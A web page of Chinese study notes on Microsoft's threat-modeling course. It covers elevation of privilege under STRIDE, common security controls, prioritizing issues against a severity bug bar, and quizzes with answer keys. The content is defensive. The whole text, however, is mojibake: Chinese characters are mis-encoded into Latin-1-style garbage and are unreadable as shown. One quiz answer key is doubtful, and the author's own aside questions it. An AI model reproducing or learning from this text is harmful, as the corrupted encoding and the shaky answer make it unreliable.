ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>åˆ©ç”¨è¾“å…¥å¤„ç†é€»è¾‘æˆ–å†…å­˜ä¸­çš„å¼±ç‚¹æ¥æå–æ•°æ®</li><li>æŸ¥æ‰¾å¹¶ä½¿ç”¨ç‰¹æƒå¸æˆ·ç ´åæœåŠ¡ï¼ˆä¸æ¬ºéª—å’Œç¯¡æ”¹å¨èƒç»“åˆä½¿ç”¨ï¼‰</li></ul><h4 id="å¯èƒ½é¢ä¸´æƒé™æå‡-é£é™©çš„å…ƒç´ å’Œäº¤äº’"><a href="#å¯èƒ½é¢ä¸´æƒé™æå‡-é£é™©çš„å…ƒç´ å’Œäº¤äº’" class="headerlink" title="å¯èƒ½é¢ä¸´æƒé™æå‡ é£é™©çš„å…ƒç´ å’Œäº¤äº’"></a>å¯èƒ½é¢ä¸´æƒé™æå‡ é£é™©çš„å…ƒç´ å’Œäº¤äº’</h4><p>å…ƒç´ </p><table><thead><tr><th align="left">åç§°</th><th align="left">å½¢çŠ¶</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„æ´»åŠ¨</td></tr></tbody></table><p>äº¤äº’</p><table><thead><tr><th align="left">åç§°</th><th align="left">äº¤äº’</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">ä¸€ä¸ªä»»åŠ¡å°†æ•°æ®å‘é€åˆ°å¦ä¸€ä¸ªä»»åŠ¡</td></tr><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; å¤–éƒ¨å®ä½“</td><td align="left"><img src="/img/thread-modeling/process-externalentity.png" class="lazyload" data-srcset="/img/thread-modeling/process-externalentity.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">ä»»åŠ¡æ¥æ”¶æ¥è‡ªç”¨æˆ·çš„æ•°æ®</td></tr><tr><td align="left">è¿‡ç¨‹ &lt;-&gt; æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">ä»»åŠ¡æ¥æ”¶æ¥è‡ªæ•°æ®å­˜å‚¨çš„æ•°æ®</td></tr></tbody></table><h4 id="å¦‚ä½•é˜²æ­¢æƒé™æå‡"><a href="#å¦‚ä½•é˜²æ­¢æƒé™æå‡" class="headerlink" title="å¦‚ä½•é˜²æ­¢æƒé™æå‡"></a>å¦‚ä½•é˜²æ­¢æƒé™æå‡</h4><p>æˆæƒç¡®ä¿ç”¨æˆ·æ‹¥æœ‰é€‚å½“çš„æƒé™ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>å®ç°æˆæƒæœºåˆ¶ä»¥éªŒè¯å¯¹æ•°æ®å’Œèµ„æºçš„æƒé™</li><li>åº”ç”¨å®‰å…¨æ§åˆ¶ï¼Œä»¥ä½¿ç”¨æœ€å°‘çš„è®¿é—®æƒé™è¿è¡ŒæœåŠ¡</li><li>ç›‘è§†è®¿é—®ä»¥æ£€æµ‹å¼‚å¸¸å’Œæœªç»æˆæƒçš„è®¿é—®å°è¯•ã€‚</li></ul><h4 id="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-5"><a href="#ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶-5" class="headerlink" title="ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶"></a>ç”¨äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å¸¸ç”¨å®‰å…¨æ§åˆ¶</h4><ul><li>è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL)</li><li>åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ (RBAC)</li><li>åŸºäºç»„çš„è®¿é—®</li><li>æƒé™</li><li>è¾“å…¥éªŒè¯</li></ul><div class="note green"><p>æ¨èé—®é¢˜ï¼šå¦‚ä½•å¾—çŸ¥ç”¨æˆ·å¯ä»¥æ‰§è¡Œæ­¤æ“ä½œï¼Ÿ</p></div><h4 id="çŸ¥è¯†æ£€æŸ¥-18"><a href="#çŸ¥è¯†æ£€æŸ¥-18" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>å“ªä¸€æ¡é™ˆè¿°æè¿°äº†é’ˆå¯¹æƒé™æå‡çš„å®‰å…¨æ§åˆ¶ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. ç³»ç»Ÿä½¿ç”¨å°½å¯èƒ½å°‘çš„æƒé™è¿è¡Œè¿›ç¨‹ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. å‘é€æ–¹å¯¹æ¶ˆæ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ä¾¿æ¥æ”¶æ–¹äº†è§£æ¶ˆæ¯çš„æ¥æºã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. ç³»ç»Ÿè®°å½•æ‰€æœ‰æ“ä½œå’Œç”¨æˆ·ï¼Œæ˜ç¡®æ¯ä¸ªäººçš„è´£ä»»ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. è¿™æ¡é™ˆè¿°é€‚ç”¨äºæƒé™æå‡ã€‚B. æ­¤æ¶ˆæ¯é€‚ç”¨äºæ¬ºéª—ã€‚C. è¿™æ¡é™ˆè¿°é€‚ç”¨äºå¦è®¤æ€§ã€‚</psw></p><h3 id="å°ç»“-4"><a href="#å°ç»“-4" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><h4 id="æ‘˜è¦-2"><a href="#æ‘˜è¦-2" class="headerlink" title="æ‘˜è¦"></a>æ‘˜è¦</h4><p>å¨èƒå»ºæ¨¡æ¡†æ¶å¯å¸®åŠ©ä½ ç”Ÿæˆæ½œåœ¨å¨èƒçš„åˆ—è¡¨ï¼Œå¹¶æ‰¾åˆ°é™ä½æˆ–æ¶ˆé™¤ç³»ç»Ÿé£é™©çš„æ–¹æ³•ã€‚ äº†è§£æ¯ç§å¨èƒç±»åˆ«åŠå…¶ç›¸åº”çš„å®‰å…¨æ§åˆ¶ã€‚</p><p>æœ¬æ¨¡å—æ¶µç›–äº†ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>è®¨è®ºäº†å¨èƒå»ºæ¨¡æ¡†æ¶ä¸­çš„æ¯ç§å¨èƒç±»åˆ«</li><li>äº†è§£äº†æœ‰åŠ©äºé™ä½æˆ–æ¶ˆé™¤é£é™©çš„å®‰å…¨æ§åˆ¶</li></ul><div class="note green"><p>ä½ çŸ¥é“å—ï¼Ÿ å¯ä»¥ä½¿ç”¨è®¸å¤šå…¶ä»–æ¡†æ¶æ¥å®ç°ä¸åŒçš„ç›®æ ‡ã€‚ ä¾‹å¦‚ï¼Œæ¸—é€æµ‹è¯•å›¢é˜Ÿå¯å°† LINDDUN ç”¨äºéšç§å¨èƒå’Œæ”»å‡»æ ‘ã€‚ æ”»å‡»æ ‘æœ‰åŠ©äºé€šè¿‡â€œå‡å®šè¿è§„â€æ€ç»´æ¥ç¡®å®šæ”»å‡»å¯èƒ½å‘ç”Ÿçš„æ–¹å¼ã€‚</p></div><h4 id="äº†è§£è¯¦ç»†ä¿¡æ¯-1"><a href="#äº†è§£è¯¦ç»†ä¿¡æ¯-1" class="headerlink" title="äº†è§£è¯¦ç»†ä¿¡æ¯"></a>äº†è§£è¯¦ç»†ä¿¡æ¯</h4><ul><li><a href="https://www.linddun.org/">LINDDUN</a> - ä¸€ç§éšç§å¨èƒå»ºæ¨¡æ–¹æ³•ï¼Œæ”¯æŒåˆ†æäººå‘˜ç³»ç»Ÿåœ°æŸ¥æ‰¾å’Œè§£å†³è½¯ä»¶ä½“ç³»ç»“æ„ä¸­çš„éšç§å¨èƒã€‚</li><li><a href="https://www.microsoft.com/security/blog/2016/11/28/disrupting-the-kill-chain/">ç½‘ç»œç»ˆæ­¢é“¾</a> - ä»‹ç»å…¸å‹çš„å·¥ä½œæµï¼ŒåŒ…æ‹¬æ”»å‡»è€…ç”¨äºæ¸—å…¥ç»„ç»‡ç½‘ç»œå’Œç³»ç»Ÿçš„æŠ€æœ¯ã€ç­–ç•¥å’Œè¿‡ç¨‹ã€‚</li><li>è¡¥ä¸Šä¸€ä¸ªå¾®è½¯å®‰å…¨åšå®¢ ï¼ˆ <a href="https://www.microsoft.com/security/blog/">https://www.microsoft.com/security/blog/</a></li></ul><h2 id="æ¨¡å—6-è®¾ç½®é—®é¢˜çš„ä¼˜å…ˆçº§å¹¶åº”ç”¨å®‰å…¨æ§åˆ¶æªæ–½"><a href="#æ¨¡å—6-è®¾ç½®é—®é¢˜çš„ä¼˜å…ˆçº§å¹¶åº”ç”¨å®‰å…¨æ§åˆ¶æªæ–½" class="headerlink" title="æ¨¡å—6 | è®¾ç½®é—®é¢˜çš„ä¼˜å…ˆçº§å¹¶åº”ç”¨å®‰å…¨æ§åˆ¶æªæ–½"></a>æ¨¡å—6 | è®¾ç½®é—®é¢˜çš„ä¼˜å…ˆçº§å¹¶åº”ç”¨å®‰å…¨æ§åˆ¶æªæ–½</h2><h3 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å¨èƒå»ºæ¨¡æ¡†æ¶å¯ä»¥å¸®åŠ©ä½ ç”Ÿæˆå¨èƒåˆ—è¡¨å’Œé™ä½é£é™©çš„æ–¹æ³•ï¼Œä½†ä¸ä¼šä¸ºä½ ç¡®å®šå…¶ä¼˜å…ˆçº§ã€‚</p><p>æ­¤å¤–ï¼Œå®ƒä¸ä¼šåŸºäºå®‰å…¨æ§åˆ¶æªæ–½çš„ç±»å‹å’ŒåŠŸèƒ½æä¾›åˆ†å±‚å»ºè®®ï¼Œå› æ­¤æ›´éš¾ç¡®å®šè¦å®ç°å“ªäº›æ§åˆ¶æªæ–½ã€‚</p><h4 id="ç¡®å®é—®é¢˜çš„ä¼˜å…ˆçº§"><a href="#ç¡®å®é—®é¢˜çš„ä¼˜å…ˆçº§" class="headerlink" title="ç¡®å®é—®é¢˜çš„ä¼˜å…ˆçº§"></a>ç¡®å®é—®é¢˜çš„ä¼˜å…ˆçº§</h4><p>ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§æ˜¯å¨èƒå»ºæ¨¡ä¸­ä¸€ä¸ªé‡è¦çš„éƒ¨åˆ†ã€‚ åœ¨èµ„æºæœ‰é™çš„æƒ…å†µä¸‹ï¼Œå®ƒå¯ä»¥å¸®åŠ©å°†èµ„æºåˆ†é…ç»™æœ€å…³é”®çš„é—®é¢˜ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>å¿…é¡»é€‰æ‹©æ˜¯è¦å®ç°è®°å½•æ‰€æœ‰ç®¡ç†æ“ä½œçš„åŠŸèƒ½ï¼Œè¿˜æ˜¯ä½¿ç”¨ SSL/TLS å¯¹æµé‡è¿›è¡ŒåŠ å¯†</li><li>ç¡®å®šæ˜¯å…ˆå®ç°è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼Œè¿˜æ˜¯å…ˆå¢å¼ºç³»ç»Ÿçš„è¾“å…¥éªŒè¯è¿‡ç¨‹</li></ul><h4 id="ä½•æ—¶è®¾ç½®ä¼˜å…ˆçº§"><a href="#ä½•æ—¶è®¾ç½®ä¼˜å…ˆçº§" class="headerlink" title="ä½•æ—¶è®¾ç½®ä¼˜å…ˆçº§"></a>ä½•æ—¶è®¾ç½®ä¼˜å…ˆçº§</h4><p>æ ¹æ®æ¯ä¸ªé—®é¢˜çš„é£é™©å› ç´ å¯¹å…¶æŒ‡å®šä¼˜å…ˆçº§ã€‚ æ­¤å¤–ï¼Œé€‰æ‹©å¯ä¸å…¶ä»–æªæ–½è”ç”¨çš„å®‰å…¨æ§åˆ¶æªæ–½ï¼Œå¯å¸®åŠ©ä¸ºä½ çš„ç³»ç»Ÿæä¾›åˆ†å±‚å®‰å…¨ä¿æŠ¤æœºåˆ¶ã€‚</p><p>æ­¤è¿‡ç¨‹å¯èƒ½éœ€è¦ä¸€æ®µæ—¶é—´æ‰èƒ½å®Œæˆã€‚ è¿˜éœ€è¦åŒäº‹å’Œå®‰å…¨å›¢é˜Ÿçš„å¸®åŠ©ã€‚ è¯·ç•™å‡ºè¶³å¤Ÿçš„æ—¶é—´æ¥ä¸å…¶åä½œã€‚</p><h4 id="å­¦ä¹ ç›®æ ‡-5"><a href="#å­¦ä¹ ç›®æ ‡-5" class="headerlink" title="å­¦ä¹ ç›®æ ‡"></a>å­¦ä¹ ç›®æ ‡</h4><p>åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†èƒ½å¤Ÿï¼š</p><ul><li>å¯¹é—®é¢˜åˆ†é…ä¼˜å…ˆçº§</li><li>å¯¹å®‰å…¨æ§åˆ¶è¿›è¡Œåˆ†ç±»</li><li>äº†è§£æ¯ä¸ªå®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½</li></ul><div class="note success"><p>æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ</p></div><h3 id="é—®é¢˜ä¼˜å…ˆçº§ã€å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½"><a href="#é—®é¢˜ä¼˜å…ˆçº§ã€å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½" class="headerlink" title="é—®é¢˜ä¼˜å…ˆçº§ã€å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½"></a>é—®é¢˜ä¼˜å…ˆçº§ã€å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½</h3><p>å¨èƒå»ºæ¨¡ç»ƒä¹ å¯å¸®åŠ©ä½ å‘ç°ä¸€äº›é—®é¢˜ï¼Œæœ‰æ—¶è¿˜ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„æ”¶è·ã€‚ ç¼ºå°‘ä¼˜å…ˆçº§å¯èƒ½ä¼šè®©å·¥ç¨‹å¸ˆæ„Ÿåˆ°ä¸çŸ¥æ‰€æªï¼Œæ— æ³•ç¡®å®šè¦é¦–å…ˆè§£å†³å“ªäº›é—®é¢˜ã€‚</p><h4 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h4><p>é¦–å…ˆï¼Œç¡®å®šé—®é¢˜å¯¹äºç³»ç»Ÿçš„é‡è¦ç¨‹åº¦ã€‚ ç„¶åï¼Œ<u>é€‰æ‹©æœ‰åˆ©äºä»¥æœ€ä½çš„æˆæœ¬æä¾›æœ€å¤§ç¨‹åº¦ä¿æŠ¤çš„å®‰å…¨æ§åˆ¶æªæ–½</u>ã€‚</p><h4 id="ç¡®å®šå®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§"><a href="#ç¡®å®šå®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§" class="headerlink" title="ç¡®å®šå®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§"></a>ç¡®å®šå®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§</h4><p>æ ¹æ®é£é™©ä¸¥é‡æ€§æ¥ç¡®å®šå®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§ã€‚ å„ç»„ç»‡çš„æ ‡ç­¾å¯èƒ½ä¸åŒã€‚ ä½†é€šå¸¸ä¼šæ ¹æ®å¨èƒè¢«æ”»å‡»è€…åˆ©ç”¨æ—¶å¸¦æ¥çš„é£é™©å½±å“ï¼Œä»¥ä»ä¸¥é‡åˆ°ä½é£é™©çš„æ¨¡å¼è®¾ç½®ä¼˜å…ˆçº§æ ‡ç­¾ã€‚</p><h4 id="ç±»å‹å’ŒåŠŸèƒ½"><a href="#ç±»å‹å’ŒåŠŸèƒ½" class="headerlink" title="ç±»å‹å’ŒåŠŸèƒ½"></a>ç±»å‹å’ŒåŠŸèƒ½</h4><p>å®‰å…¨æ§åˆ¶å…·æœ‰ä¸åŒçš„ç±»å‹å’ŒåŠŸèƒ½ã€‚</p><p>æœ‰ä¸‰ä¸ªä¸»è¦çš„ç±»åˆ«å¯å¸®åŠ©ä½ å…³æ³¨å®‰å…¨æ€§çš„ä¸‰ç§å½¢å¼ã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ç‰©ç†ï¼šæ‘„åƒå¤´ã€å¾½ç« å’Œå›´æ </li><li>æŠ€æœ¯ï¼šåŠ å¯†ã€è™šæ‹Ÿé˜²ç«å¢™å’Œé˜²ç—…æ¯’è½¯ä»¶</li><li>ç®¡ç†ï¼šç­–ç•¥ã€æ³•è§„å’Œä¹¦é¢è¦æ±‚</li></ul><p>åŠŸèƒ½çš„æ„ä¹‰åœ¨äºé’ˆå¯¹æ½œåœ¨å¨èƒæ¯ä¸ªé˜¶æ®µå¸®åŠ©ä¿æŠ¤ç³»ç»Ÿã€‚</p><p>ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ç”¨é”é˜²æ­¢å…¥ä¾µ</li><li>å®‰è£…æ‘„åƒå¤´æ¥æ£€æµ‹å…¥ä¾µ</li><li>åˆ¶å®šå…¥ä¾µå“åº”è®¡åˆ’</li><li>ä¿®å¤ç”±å…¥ä¾µå¯¼è‡´çš„ç ´å</li><li>ä½¿ç”¨æ ‡å¿—å’Œå…¶ä»–å®‰å…¨æ§åˆ¶æªæ–½é˜²æ‚£äºæœªç„¶</li></ul><p>åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­ï¼Œæˆ‘ä»¬å°†äº†è§£ä¼˜å…ˆçº§ã€ç±»å‹å’ŒåŠŸèƒ½ã€‚</p><h3 id="è®¾ç½®å®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§"><a href="#è®¾ç½®å®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§" class="headerlink" title="è®¾ç½®å®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§"></a>è®¾ç½®å®‰å…¨é—®é¢˜çš„ä¼˜å…ˆçº§</h3><p>ç”ŸæˆåŒ…å«é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•çš„å¨èƒåˆ—è¡¨ã€‚ ç„¶åï¼Œä¸åŒäº‹åˆä½œåˆ†é…ä¼˜å…ˆçº§ã€‚</p><h4 id="é€‰æ‹©ä¼˜å…ˆçº§æ¡†æ¶"><a href="#é€‰æ‹©ä¼˜å…ˆçº§æ¡†æ¶" class="headerlink" title="é€‰æ‹©ä¼˜å…ˆçº§æ¡†æ¶"></a>é€‰æ‹©ä¼˜å…ˆçº§æ¡†æ¶</h4><p>ä¼˜å…ˆçº§ç»ƒä¹ åº”éµå¾ªç»„ç»‡åˆ›å»ºçš„å†…éƒ¨å®‰å…¨ bug æ ã€‚</p><p>Microsoft å·¥ç¨‹å¸ˆä½¿ç”¨çš„å†…éƒ¨ bug æ ç±»ä¼¼äºä¸‹è¡¨ï¼Œä¾›ä½ å‚è€ƒï¼š</p><p>Microsoft å·¥ç¨‹å¸ˆä½¿ç”¨çš„å†…éƒ¨ bug æ ç±»ä¼¼äºä¸‹è¡¨ï¼Œä¾›ä½ å‚è€ƒï¼š</p><table><thead><tr><th align="left">å›¾æ ‡</th><th align="left">ä¸¥é‡æ€§</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><img src="/img/thread-modeling/critical.png" class="lazyload" data-srcset="/img/thread-modeling/critical.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="critical"></td><td align="left">ä¸¥é‡</td><td align="left">å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸¥é‡å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„æ¼çš„è¡Œä¸ºå’Œéœ€è¦éšç§å’Œæ³•å¾‹å‚ä¸çš„å¨èƒ</td></tr><tr><td align="left"><img src="/img/thread-modeling/important.png" class="lazyload" data-srcset="/img/thread-modeling/important.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="important"></td><td align="left">é‡è¦è¯´æ˜</td><td align="left">å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸¥é‡å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬åœ¨æ²¡æœ‰å·²çŸ¥çš„è§£å†³æ–¹æ³•æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸å¯ç”¨</td></tr><tr><td align="left"><img src="/img/thread-modeling/moderate.png" class="lazyload" data-srcset="/img/thread-modeling/moderate.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="moderate"></td><td align="left">é€‚ä¸­</td><td align="left">å¯èƒ½å¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸­ç­‰ç¨‹åº¦çš„å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬å­˜åœ¨å¯èƒ½çš„è§£å†³æ–¹æ³•çš„å¯ç”¨æ€§é—®é¢˜</td></tr><tr><td align="left"><img src="/img/thread-modeling/low.png" class="lazyload" data-srcset="/img/thread-modeling/low.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="low"></td><td align="left">ä½</td><td align="left">å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆè½»å¾®å½±å“</td></tr><tr><td align="left"><img src="/img/thread-modeling/information.png" class="lazyload" data-srcset="/img/thread-modeling/information.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="information"></td><td align="left">ä¿¡æ¯</td><td align="left">å·²è€ƒè™‘ã€è¯„ä¼°æ½œåœ¨å¨èƒå¹¶è®¤ä¸ºå®ƒæ— å…³ç´§è¦</td></tr></tbody></table><h4 id="çŸ¥è¯†æ£€æŸ¥-19"><a href="#çŸ¥è¯†æ£€æŸ¥-19" class="headerlink" title="çŸ¥è¯†æ£€æŸ¥"></a>çŸ¥è¯†æ£€æŸ¥</h4><ol><li>å¯èƒ½ä¼šå¯¹ç”¨æˆ·é€ æˆä¸¥é‡å½±å“çš„é—®é¢˜é€šå¸¸å±äºå“ªä¸ªä¼˜å…ˆçº§ï¼Ÿ</li></ol><div class='checkbox'><input type="radio" />            <p>A. é‡è¦è¯´æ˜ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>B. ä¸¥é‡ã€‚</p>            </div><div class='checkbox'><input type="radio" />            <p>C. é€‚ä¸­ã€‚</p>            </div><p>å‚è€ƒç­”æ¡ˆï¼š<psw>== A ==</psw></p><p>è§£é‡Šï¼š<psw>A. å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸¥é‡å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬åœ¨æ²¡æœ‰å·²çŸ¥çš„è§£å†³æ–¹æ³•æ—¶æ˜¾ç¤ºç³»ç»Ÿä¸å¯ç”¨ã€‚B. å¯èƒ½ä¼šå¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸¥é‡å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„æ¼çš„è¡Œä¸ºå’Œéœ€è¦éšç§å’Œæ³•å¾‹å‚ä¸çš„å¨èƒã€‚C. å¯èƒ½å¯¹ç³»ç»Ÿç”¨æˆ·é€ æˆä¸­ç­‰ç¨‹åº¦çš„å½±å“ã€‚ ç¤ºä¾‹åŒ…æ‹¬å­˜åœ¨å¯èƒ½çš„è§£å†³æ–¹æ³•çš„å¯ç”¨æ€§é—®é¢˜ã€‚ ï¼ˆEmmm æ„Ÿè§‰ B ä¹Ÿè¡Œï¼Ÿ</psw></p><h3 id="å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½-1"><a href="#å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½-1" class="headerlink" title="å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½"></a>å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹å’ŒåŠŸèƒ½</h3><p>ç¡®å®šæ¯ä¸ªé—®é¢˜çš„ä¼˜å…ˆçº§åï¼Œè¯·æŸ¥çœ‹å®‰å…¨æ§åˆ¶æªæ–½åˆ—è¡¨ï¼Œå¹¶é€‰æ‹©å¯¹ä½ çš„ç³»ç»Ÿæœ€æœ‰ç›Šçš„é€‰é¡¹ã€‚</p><p>æœ€æœ‰ç›Šçš„å®‰å…¨æ§åˆ¶æªæ–½ä¸€èˆ¬ä¼šè·¨å¤šä¸ª STRIDE ç±»åˆ«ã€‚ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ç°è¿™äº›æ­¥éª¤çš„æˆæœ¬ç›¸å¯¹è¾ƒä½ã€‚</p><h4 id="å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹"><a href="#å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹" class="headerlink" title="å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹"></a>å®‰å…¨æ§åˆ¶æªæ–½ç±»å‹</h4><p>è¯„ä¼°æ¯é¡¹å®‰å…¨æ§åˆ¶æªæ–½æ—¶ï¼Œä½ ä¼šæ³¨æ„åˆ°å®ƒä»¬å±äºä»¥ä¸‹ç±»å‹ä¹‹ä¸€ï¼š</p><table><thead><tr><th align="left">å›¾æ ‡</th><th align="left">ç±»å‹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><img src="/img/thread-modeling/physical.png" class="lazyload" 